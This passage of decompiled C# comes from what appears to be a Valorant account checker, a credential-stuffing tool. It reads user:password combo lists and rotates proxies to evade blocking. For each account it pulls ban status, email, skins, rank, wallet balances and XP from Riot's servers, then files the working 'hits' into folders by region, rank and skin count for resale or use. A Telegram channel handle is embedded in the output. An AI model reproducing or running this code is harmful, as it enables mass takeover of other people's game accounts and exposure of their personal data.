					new Dictionary<string, string>();
					httpRequest.AddHeader("Authorization", "Bearer " + access_token);
					JObject jobject = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.POST, new Uri("https://auth.riotgames.com/userinfo"), null).ToString());
					if ((string)jobject["Banned"] == "True" && !CheckerHelper.banned_accounts.Any(new Func<string, bool>(text.Contains)))
					{
						CheckerHelper.banned_accounts.Add(text);
					}
					Dictionary<string, string> dictionary = CheckerHelper.account_info_to_object(jobject, text);
					string text2;
					if (CheckerHelper.translate_cpid((string)jobject["original_platform_id"]) == null)
					{
						text2 = null;
					}
					else
					{
						text2 = CheckerHelper.translate_country(CheckerHelper.translate_cpid((string)jobject["original_platform_id"]));
					}
					if (text2 == "eu" || text2 == "na" || text2 == "ap" || text2 == "kr")
					{
						foreach (string text3 in CheckerHelper.regions)
						{
							if (text2 != text3)
							{
								list.Add(text3);
							}
						}
						dictionary.Add("Region", text2.ToUpper());
					}
					if (CheckerHelper.skip_banned_accounts && CheckerHelper.banned_accounts.Any(new Func<string, bool>(text.Contains)))
					{
						string str = CheckerHelper.account_info_object_to_string(dictionary, text);
						CheckerHelper.full_captures.Add(str + "\n===================================================");
						CheckerHelper.captured_combos.Add(text);
						CheckerHelper.SaveCapture();
						CheckerHelper.check++;
						break;
					}
					httpRequest.AddHeader("Authorization", "Bearer " + access_token);
					string text4 = (string)JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.POST, new Uri("https://entitlements.auth.riotgames.com/api/token/v1"), new StringContent("{\"Authorization\": \"" + access_token + "\"}")
					{
						ContentType = "application/json"
					}).ToString())["entitlements_token"];
					if (CheckerHelper.capture_email)
					{
						httpRequest.AddHeader("Authorization", "Bearer " + access_token);
						JObject jobject2 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri("https://email-verification.riotgames.com/api/v1/account/status"), null).ToString());
						dictionary.Add("E-Mail", ((string)jobject2["email"]) ?? "Unknown");
						dictionary.Add("E-Mail Verified", ((string)jobject2["emailVerified"]) ?? "Unknown");
					}
					string text5 = jobject["sub"].ToString();
					Dictionary<string, List<string>> dictionary2 = new Dictionary<string, List<string>>();
					foreach (string text6 in CheckerHelper.regions)
					{
						if (!list.Any(new Func<string, bool>(text6.Contains)))
						{
							httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
							httpRequest.AddHeader("X-Riot-ClientVersion", (string)CheckerHelper.api_version["data"]["riotClientVersion"]);
							httpRequest.AddHeader("X-Riot-Entitlements-JWT", text4 ?? "");
							httpRequest.AddHeader("Authorization", "Bearer " + access_token);
							JObject jobject3 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri(string.Concat(new string[]
							{
								"https://pd.",
								text6.ToLower(),
								".a.pvp.net/store/v1/entitlements/",
								text5,
								"/e7c63390-eda7-46e0-bb7a-a6abdacd2433"
							})), null).ToString());
							if (jobject3.ContainsKey("Entitlements"))
							{
								JToken skins = jobject3["Entitlements"];
								dictionary2.Add(text6, CheckerHelper.convert_entitlements_to_skins(skins));
							}
						}
					}
					string text7 = "";
					foreach (KeyValuePair<string, List<string>> keyValuePair in dictionary2)
					{
						text7 += CheckerHelper.add_inventory_type("Skins", "", keyValuePair.Value, keyValuePair.Key.ToUpper());
					}
					if (CheckerHelper.capture_last_played_match)
					{
						foreach (string text8 in CheckerHelper.regions)
						{
							if (!list.Any(new Func<string, bool>(text8.Contains)))
							{
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								httpRequest.AddHeader("X-Riot-ClientVersion", (string)CheckerHelper.api_version["data"]["riotClientVersion"]);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", text4 ?? "");
								httpRequest.AddHeader("Authorization", "Bearer " + access_token);
								JObject jobject4 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri("https://pd." + text8.ToLower() + ".a.pvp.net/match-history/v1/history/" + text5), null).ToString());
								if (jobject4.ContainsKey("httpStatus") && (string)jobject4["httpStatus"] == "404")
								{
									dictionary.Add("[" + text8.ToUpper() + "] Last match played", "Never played");
								}
								else if (!jobject4.ContainsKey("History"))
								{
									dictionary.Add("[" + text8.ToUpper() + "] Last match played", "Never played (couldn't detect)");
								}
								else if (((JArray)jobject4["History"]).Count != 0)
								{
									dictionary.Add("[" + text8.ToUpper() + "] Last match played", (string)jobject4["History"][0]["GameStartTime"] + " (" + (string)jobject4["History"][0]["QueueID"] + ")");
								}
								else
								{
									dictionary.Add("[" + text8.ToUpper() + "] Last match played", "Never played");
								}
							}
						}
					}
					if (CheckerHelper.capture_rank)
					{
						Dictionary<string, string> dictionary3 = new Dictionary<string, string>();
						dictionary3.Add("0", "Unranked");
						dictionary3.Add("1", "Unused1");
						dictionary3.Add("2", "Unused2");
						dictionary3.Add("3", "Iron 1");
						dictionary3.Add("4", "Iron 2");
						dictionary3.Add("5", "Iron 3");
						dictionary3.Add("6", "Bronze 1");
						dictionary3.Add("7", "Bronze 2");
						dictionary3.Add("8", "Bronze 3");
						dictionary3.Add("9", "Silver 1");
						dictionary3.Add("10", "Silver 2");
						dictionary3.Add("11", "Silver 3");
						dictionary3.Add("12", "Gold 1");
						dictionary3.Add("13", "Gold 2");
						dictionary3.Add("14", "Gold 3");
						dictionary3.Add("15", "Platinum 1");
						dictionary3.Add("16", "Platinum 2");
						dictionary3.Add("17", "Platinum 3");
						dictionary3.Add("18", "Diamond 1");
						dictionary3.Add("19", "Diamond 2");
						dictionary3.Add("20", "Diamond 3");
						dictionary3.Add("21", "Immortal 1");
						dictionary3.Add("22", "Immortal 2");
						dictionary3.Add("23", "Immortal 3");
						dictionary3.Add("24", "Radiant");
						foreach (string text9 in CheckerHelper.regions)
						{
							if (!list.Any(new Func<string, bool>(text9.Contains)))
							{
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								httpRequest.AddHeader("X-Riot-ClientVersion", (string)CheckerHelper.api_version["data"]["riotClientVersion"]);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", text4 ?? "");
								httpRequest.AddHeader("Authorization", "Bearer " + access_token);
								JObject jobject5 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri(string.Concat(new string[]
								{
									"https://pd.",
									text9.ToLower(),
									".a.pvp.net/mmr/v1/players/",
									text5,
									"/competitiveupdates"
								})), null).ToString());
								if (jobject5.ContainsKey("Matches"))
								{
									if (((JArray)jobject5["Matches"]).Count != 0)
									{
										string key = (string)jobject5["Matches"][0]["TierAfterUpdate"];
										if (dictionary3.ContainsKey(key))
										{
											dictionary.Add("[" + text9.ToUpper() + "] Rank", dictionary3[key]);
										}
										else
										{
											dictionary.Add("[" + text9.ToUpper() + "] Rank", "Unknown");
										}
									}
									else
									{
										dictionary.Add("[" + text9.ToUpper() + "] Rank", "Unranked");
									}
								}
								else
								{
									dictionary.Add("[" + text9.ToUpper() + "] Rank", "Unknown");
								}
							}
						}
					}
					if (CheckerHelper.capture_wallet)
					{
						Dictionary<string, string> dictionary4 = new Dictionary<string, string>();
						dictionary4.Add("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "VP");
						dictionary4.Add("f08d4ae3-939c-4576-ab26-09ce1f23bb37", "Free Agents");
						dictionary4.Add("e59aa87c-4cbf-517a-5983-6e81511be9b7", "Radianite Points");
						foreach (string text10 in CheckerHelper.regions)
						{
							if (!list.Any(new Func<string, bool>(text10.Contains)))
							{
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								httpRequest.AddHeader("X-Riot-ClientVersion", (string)CheckerHelper.api_version["data"]["riotClientVersion"]);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", text4 ?? "");
								httpRequest.AddHeader("Authorization", "Bearer " + access_token);
								JObject jobject6 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri("https://pd." + text10.ToLower() + ".a.pvp.net/store/v1/wallet/" + text5), null).ToString());
								if (jobject6.ContainsKey("Balances"))
								{
									using (IEnumerator<JToken> enumerator3 = ((IEnumerable<JToken>)jobject6["Balances"]).GetEnumerator())
									{
										while (enumerator3.MoveNext())
										{
											JToken jtoken = enumerator3.Current;
											foreach (KeyValuePair<string, JToken> keyValuePair2 in JObject.Parse("{" + jtoken.ToString() + "}"))
											{
												dictionary.Add("[" + text10.ToUpper() + "] " + dictionary4[keyValuePair2.Key], (string)keyValuePair2.Value);
											}
										}
										continue;
									}
								}
								list.Add(text10);
							}
						}
					}
					if (CheckerHelper.capture_xp)
					{
						foreach (string text11 in CheckerHelper.regions)
						{
							if (!list.Any(new Func<string, bool>(text11.Contains)))
							{
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								httpRequest.AddHeader("X-Riot-ClientVersion", (string)CheckerHelper.api_version["data"]["riotClientVersion"]);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", text4 ?? "");
								httpRequest.AddHeader("Authorization", "Bearer " + access_token);
								JObject jobject7 = JObject.Parse(CheckerHelper.HandleRequest(httpRequest, HttpMethod.GET, new Uri("https://pd." + text11.ToLower() + ".a.pvp.net/account-xp/v1/players/" + text5), null).ToString());
								if (jobject7.ContainsKey("Progress"))
								{
									try
									{
										dictionary.Add("[" + text11.ToUpper() + "] Level", (string)jobject7["Progress"]["Level"]);
										dictionary.Add("[" + text11.ToUpper() + "] XP", (string)jobject7["Progress"]["XP"]);
										continue;
									}
									catch
									{
										dictionary.Add("[" + text11.ToUpper() + "] Level", "Unknown");
										dictionary.Add("[" + text11.ToUpper() + "] XP", "Unknown");
										continue;
									}
								}
								dictionary.Add("[" + text11.ToUpper() + "] Level", "Unknown");
								dictionary.Add("[" + text11.ToUpper() + "] XP", "Unknown");
							}
						}
					}
					string str2 = CheckerHelper.account_info_object_to_string(dictionary, text);
					foreach (string text12 in CheckerHelper.regions)
					{
						if (!list.Any(new Func<string, bool>(text12.Contains)))
						{
							CheckerHelper.filter_accounts_capture[text12.ToLower()].Add(str2 + text7);
							CheckerHelper.full_captures.Add(str2 + text7);
							CheckerHelper.filter_accounts_raw[text12.ToLower()].Add(text);
						}
					}
					try
					{
						foreach (string text13 in CheckerHelper.regions)
						{
							if (!list.Any(new Func<string, bool>(text13.Contains)))
							{
								CheckerHelper.FilterAccount(text13.ToLower(), str2 + text7, text, (!dictionary2.ContainsKey(text13)) ? 0 : dictionary2[text13].Count, dictionary["E-Mail Verified"] == "True", (!CheckerHelper.capture_rank) ? null : dictionary["[" + text13.ToUpper() + "] Rank"], int.Parse(dictionary["[" + text13.ToUpper() + "] Level"]));
							}
						}
					}
					catch
					{
					}
					if (!CheckerHelper.capture_process.Any(new Func<string, bool>(text.Contains)))
					{
						CheckerHelper.check++;
						CheckerHelper.captured_combos.Add(text);
						CheckerHelper.SaveCapture();
						flag = true;
						break;
					}
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000057DC File Offset: 0x000039DC
		public static void FilterAccount(string region, string capture, string combo, int skins, bool verified, string rank = null, int level = 0)
		{
			string currentDirectory = Environment.CurrentDirectory;
			if (rank != null)
			{
				string text;
				if (rank != "Unranked")
				{
					text = rank.Split(new char[]
					{
						' '
					})[0];
				}
				else
				{
					text = "Unranked";
				}
				if (!Directory.Exists(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Ranked/",
					text
				})))
				{
					Directory.CreateDirectory(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text
					}));
					Directory.CreateDirectory(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Verified"
					}));
					Directory.CreateDirectory(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Unverified"
					}));
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/RAW.txt"
					})).Dispose();
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/FULL_CAPTURE.txt"
					})).Dispose();
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Unverified/RAW.txt"
					})).Dispose();
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Unverified/FULL_CAPTURE.txt"
					})).Dispose();
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Verified/RAW.txt"
					})).Dispose();
					File.Create(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Verified/FULL_CAPTURE.txt"
					})).Dispose();
				}
				if (verified)
				{
					using (StreamWriter streamWriter = File.AppendText(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Verified/RAW.txt"
					})))
					{
						streamWriter.WriteLine(combo);
					}
					using (StreamWriter streamWriter2 = File.AppendText(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked/",
						text,
						"/Verified/FULL_CAPTURE.txt"
					})))
					{
						streamWriter2.Write(capture + "\n");
						goto IL_4C6;
					}
				}
				using (StreamWriter streamWriter3 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Ranked/",
					text,
					"/Unverified/RAW.txt"
				})))
				{
					streamWriter3.WriteLine(combo);
				}
				using (StreamWriter streamWriter4 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Ranked/",
					text,
					"/Unverified/FULL_CAPTURE.txt"
				})))
				{
					streamWriter4.Write(capture + "\n");
				}
				IL_4C6:
				using (StreamWriter streamWriter5 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Ranked/",
					text,
					"/RAW.txt"
				})))
				{
					streamWriter5.WriteLine(combo);
				}
				using (StreamWriter streamWriter6 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Ranked/",
					text,
					"/FULL_CAPTURE.txt"
				})))
				{
					streamWriter6.Write(capture + "\n");
				}
				if (!verified)
				{
					if (!CheckerHelper.filter_accounts_ranks[text].ContainsKey(region.ToLower()))
					{
						CheckerHelper.filter_accounts_ranks[text].Add(region.ToLower(), new Dictionary<string, int>
						{
							{
								"verified",
								0
							},
							{
								"unverified",
								1
							}
						});
					}
					else
					{
						Dictionary<string, int> dictionary = CheckerHelper.filter_accounts_ranks[text][region.ToLower()];
						dictionary["unverified"] = dictionary["unverified"] + 1;
					}
				}
				else if (CheckerHelper.filter_accounts_ranks[text].ContainsKey(region.ToLower()))
				{
					CheckerHelper.filter_accounts_ranks[text][region.ToLower()]["verified"] = CheckerHelper.filter_accounts_ranks[text][region.ToLower()]["verified"] + 1;
				}
				else
				{
					CheckerHelper.filter_accounts_ranks[text].Add(region.ToLower(), new Dictionary<string, int>
					{
						{
							"verified",
							1
						},
						{
							"unverified",
							0
						}
					});
				}
				if (level > 20)
				{
					if (!verified)
					{
						CheckerHelper.filter_accounts_ranked_ready["Unverified"][region.ToLower()]["FULL_CAPTURE"].Add(capture);
						CheckerHelper.filter_accounts_ranked_ready["Unverified"][region.ToLower()]["RAW"].Add(combo);
						using (StreamWriter streamWriter7 = File.AppendText(string.Concat(new string[]
						{
							currentDirectory,
							"/Hits/",
							CheckerHelper.datetime_now_to_string,
							"/Regions/",
							region.ToUpper(),
							"/Ranked_Ready/Unverified/FULL_CAPTURE.txt"
						})))
						{
							streamWriter7.Write(capture + "\n");
						}
						using (StreamWriter streamWriter8 = File.AppendText(string.Concat(new string[]
						{
							currentDirectory,
							"/Hits/",
							CheckerHelper.datetime_now_to_string,
							"/Regions/",
							region.ToUpper(),
							"/Ranked_Ready/Unverified/RAW.txt"
						})))
						{
							streamWriter8.Write(combo + "\n");
							goto IL_8E6;
						}
					}
					CheckerHelper.filter_accounts_ranked_ready["Verified"][region.ToLower()]["FULL_CAPTURE"].Add(capture);
					CheckerHelper.filter_accounts_ranked_ready["Verified"][region.ToLower()]["RAW"].Add(combo);
					using (StreamWriter streamWriter9 = File.AppendText(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked_Ready/Verified/FULL_CAPTURE.txt"
					})))
					{
						streamWriter9.Write(capture + "\n");
					}
					using (StreamWriter streamWriter10 = File.AppendText(string.Concat(new string[]
					{
						currentDirectory,
						"/Hits/",
						CheckerHelper.datetime_now_to_string,
						"/Regions/",
						region.ToUpper(),
						"/Ranked_Ready/Verified/RAW.txt"
					})))
					{
						streamWriter10.Write(combo + "\n");
					}
				}
			}
			IL_8E6:
			string text2 = "0";
			skins--;
			if (skins == 0)
			{
				text2 = "0";
			}
			else if (skins != 0 && skins <= 10)
			{
				text2 = "1-10";
			}
			else if (skins >= 11 && skins <= 20)
			{
				text2 = "11-20";
			}
			else if (skins >= 21 && skins <= 30)
			{
				text2 = "21-30";
			}
			else if (skins >= 31 && skins <= 40)
			{
				text2 = "31-40";
			}
			else if (skins >= 41 && skins <= 50)
			{
				text2 = "41-50";
			}
			else if (skins >= 51 && skins <= 80)
			{
				text2 = "51-80";
			}
			else if (skins >= 81 && skins <= 100)
			{
				text2 = "81-100";
			}
			else if (skins >= 101 && skins <= 150)
			{
				text2 = "101-150";
			}
			else if (skins >= 151 && skins <= 200)
			{
				text2 = "151-200";
			}
			else if (skins > 200)
			{
				text2 = "200+";
			}
			if (!Directory.Exists(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2
			})))
			{
				Directory.CreateDirectory(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2
				}));
				Directory.CreateDirectory(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Verified"
				}));
				Directory.CreateDirectory(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Unverified"
				}));
			}
			if (!File.Exists(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/FULL_CAPTURE.txt"
			})))
			{
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/FULL_CAPTURE.txt"
				})).Dispose();
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/RAW.txt"
				})).Dispose();
			}
			if (!File.Exists(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/Verified/RAW.txt"
			})))
			{
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Verified/RAW.txt"
				})).Dispose();
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Verified/FULL_CAPTURE.txt"
				})).Dispose();
			}
			if (!File.Exists(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/Unverified/RAW.txt"
			})))
			{
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Unverified/RAW.txt"
				})).Dispose();
				File.Create(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Unverified/FULL_CAPTURE.txt"
				})).Dispose();
			}
			if (verified)
			{
				using (StreamWriter streamWriter11 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Verified/RAW.txt"
				})))
				{
					streamWriter11.WriteLine(combo);
				}
				using (StreamWriter streamWriter12 = File.AppendText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					region.ToUpper(),
					"/Skinned/",
					text2,
					"/Verified/FULL_CAPTURE.txt"
				})))
				{
					streamWriter12.Write(capture + "\n");
					goto IL_F3B;
				}
			}
			using (StreamWriter streamWriter13 = File.AppendText(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/Unerified/RAW.txt"
			})))
			{
				streamWriter13.WriteLine(combo);
			}
			using (StreamWriter streamWriter14 = File.AppendText(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/Unverified/FULL_CAPTURE.txt"
			})))
			{
				streamWriter14.Write(capture + "\n");
			}
			IL_F3B:
			using (StreamWriter streamWriter15 = File.AppendText(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/RAW.txt"
			})))
			{
				streamWriter15.WriteLine(combo);
			}
			using (StreamWriter streamWriter16 = File.AppendText(string.Concat(new string[]
			{
				currentDirectory,
				"/Hits/",
				CheckerHelper.datetime_now_to_string,
				"/Regions/",
				region.ToUpper(),
				"/Skinned/",
				text2,
				"/FULL_CAPTURE.txt"
			})))
			{
				streamWriter16.Write(capture + "\n");
			}
			if (!CheckerHelper.filter_accounts_skins[text2].ContainsKey(region.ToLower()))
			{
				CheckerHelper.filter_accounts_skins[text2].Add(region.ToLower(), 1);
				return;
			}
			CheckerHelper.filter_accounts_skins[text2][region.ToLower()] = CheckerHelper.filter_accounts_skins[text2][region.ToLower()] + 1;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00006914 File Offset: 0x00004B14
		public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
			result = result.AddSeconds(unixTimeStamp).ToLocalTime();
			return result;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00006948 File Offset: 0x00004B48
		public static string add_inventory_type(string item, string text, List<string> items, string region)
		{
			string text2 = text;
			text2 = text2 + "\n|-------------[" + region.ToUpper() + "]-------------";
			text2 += string.Format("\n|-------------[{0}({1})]-------------", item, items.Count - 1);
			foreach (string text3 in items)
			{
				if (text3 != "")
				{
					text2 = text2 + "\n| " + text3;
				}
			}
			text2 += "\n===================================================";
			text2 += "\n<================[t.me/valosharp]>================>";
			return text2;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000069FC File Offset: 0x00004BFC
		public static void load_api_data()
		{
			using (HttpRequest httpRequest = new HttpRequest())
			{
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.ConnectTimeout = CheckerHelper.proxy_timeout;
				httpRequest.Cookies = null;
				httpRequest.UseCookies = true;
				httpRequest.UserAgentRandomize();
				httpRequest.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
				httpRequest.AddHeader(HttpHeader.Accept, "*/*");
				CheckerHelper.api_skins = ((JObject)JsonConvert.DeserializeObject(httpRequest.Get("https://valorant-api.com/v1/weapons/skins", null).ToString()))["data"].Value<JArray>();
				CheckerHelper.api_version = JObject.Parse(httpRequest.Get("https://valorant-api.com/v1/version", null).ToString());
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00006AC0 File Offset: 0x00004CC0
		public static void Check()
		{
			for (;;)
			{
				int num = new Random().Next(CheckerHelper.proxies.Count - 1);
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>())
						{
							CheckerHelper.stop++;
						}
						if (CheckerHelper.stop > 0 && CheckerHelper.check == CheckerHelper.valid_accounts.Count && CheckerHelper.check + CheckerHelper.invalid_accounts.Count + CheckerHelper.banned_accounts.Count + CheckerHelper.archived_accounts.Count + CheckerHelper.multifactor_accounts.Count == CheckerHelper.accounts.Count && CheckerHelper.check == CheckerHelper.valid_accounts.Count + CheckerHelper.invalid_accounts.Count + CheckerHelper.banned_accounts.Count + CheckerHelper.archived_accounts.Count + CheckerHelper.multifactor_accounts.Count)
						{
							break;
						}
						Interlocked.Increment(ref CheckerHelper.accindex);
						string[] array = CheckerHelper.accounts[CheckerHelper.accindex].Split(new char[]
						{
							':',
							';',
							'|'
						});
						string text = array[0] + ":" + array[1];
						if (!CheckerHelper.valid_accounts.Any(new Func<string, bool>(text.Contains)) && !CheckerHelper.captured_combos.Any(new Func<string, bool>(text.Contains)))
						{
							if (CheckerHelper.proxytype == "0")
							{
								httpRequest.Proxy = HttpProxyClient.Parse(CheckerHelper.proxies[num]);
								httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
							}
							if (CheckerHelper.proxytype == "1")
							{
								httpRequest.Proxy = Socks4ProxyClient.Parse(CheckerHelper.proxies[num]);
								httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
							}
							if (CheckerHelper.proxytype == "2")
							{
								httpRequest.Proxy = Socks5ProxyClient.Parse(CheckerHelper.proxies[num]);
								httpRequest.Proxy.ConnectTimeout = CheckerHelper.proxy_timeout;
							}
							httpRequest.KeepAlive = true;
							httpRequest.IgnoreProtocolErrors = true;
							httpRequest.ConnectTimeout = CheckerHelper.proxy_timeout;
							httpRequest.Cookies = null;
							httpRequest.UseCookies = true;
							httpRequest.UserAgentRandomize();
